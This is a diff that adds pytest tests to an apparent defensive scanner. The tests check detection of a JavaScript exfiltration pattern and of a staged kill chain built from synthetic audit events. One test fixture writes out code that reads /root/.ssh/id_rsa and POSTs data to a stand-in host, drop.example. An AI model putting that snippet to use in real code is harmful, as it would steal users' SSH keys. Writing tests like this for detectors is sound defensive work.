@@ -357,3 +357,66 @@ def test_full_system_scanner_ioc_and_auto_quarantine(tmp_path):
     assert "LockBit_Note_Dropper" in guardian.flagged_threats[0]["type"]
     assert not bad_file.exists()
     assert len(store.list_quarantine_items(status="QUARANTINED")) == 1
+
+
+def test_multi_head_attention_convergent_js(tmp_path):
+    from agent import repo_scanner
+
+    stealth_dir = tmp_path / "stealth_js"
+    stealth_dir.mkdir()
+    (stealth_dir / "helper.js").write_text(
+        'const fs = require("fs");\n'
+        'function readKey() { return fs.readFileSync("/root/.ssh/id_rsa", "utf8"); }\n'
+        'function pack(v) { return Buffer.from(v, "base64").toString("hex"); }\n'
+        'function ship(body) { return fetch("https://drop.example/collect", { method: "POST", body }); }\n',
+        encoding="utf-8",
+    )
+    report = repo_scanner.scan_repository(str(stealth_dir), quiet=True)
+    threats = {item["threat"] for item in report["findings"]}
+    assert "Multi-Head Attention: Convergent Stealth Exfiltration Pattern" in threats
+
+    clean_dir = tmp_path / "clean_js"
+    clean_dir.mkdir()
+    (clean_dir / "api.js").write_text(
+        'export async function getStatus() { return fetch("https://api.example/health"); }\n',
+        encoding="utf-8",
+    )
+    clean_report = repo_scanner.scan_repository(str(clean_dir), quiet=True)
+    assert clean_report["findings"] == []
+
+
+def test_kill_chain_sequence_correlator(tmp_path):
+    store = CogniGuardStore(str(tmp_path / "killchain.db"))
+    agent = CogniGuardAgent()
+
+    store.record_audit_event({
+        "verdict": "INTRUSION_DETECTED",
+        "threat_score": 0.96,
+        "action_taken": "BLOCK_AND_QUARANTINE",
+        "filename": "dropper.vbs",
+        "timestamp": "2026-11-11 15:00:00",
+    })
+    store.record_audit_event({
+        "verdict": "INTRUSION_DETECTED",
+        "threat_score": 0.97,
+        "action_taken": "FLAGGED_LIVE_PROCESS",
+        "filename": "certutil.exe (PID 2020)",
+        "timestamp": "2026-11-11 15:00:25",
+    })
+    store.record_audit_event({
+        "verdict": "INTRUSION_DETECTED",
+        "threat_score": 0.98,
+        "action_taken": "FLAGGED_C2_SOCKET",
+        "filename": "beacon.exe (PID 2020)",
+        "source_url": "198.51.100.42:4444",
+        "timestamp": "2026-11-11 15:00:50",
+    })
+
+    kc = agent.audit_kill_chains(store=store, window_seconds=300)
+    assert kc["status"] == "KILL_CHAIN_DETECTED"
+    assert kc["severity"] == "CRITICAL"
+    assert kc["stages_detected"] == ["INGRESS", "EXECUTION", "EXFILTRATION"]
+    assert kc["sequence_score"] == 0.75
+
+    isolated = agent.audit_kill_chains(store=store, window_seconds=10)
+    assert isolated["status"] == "OK"
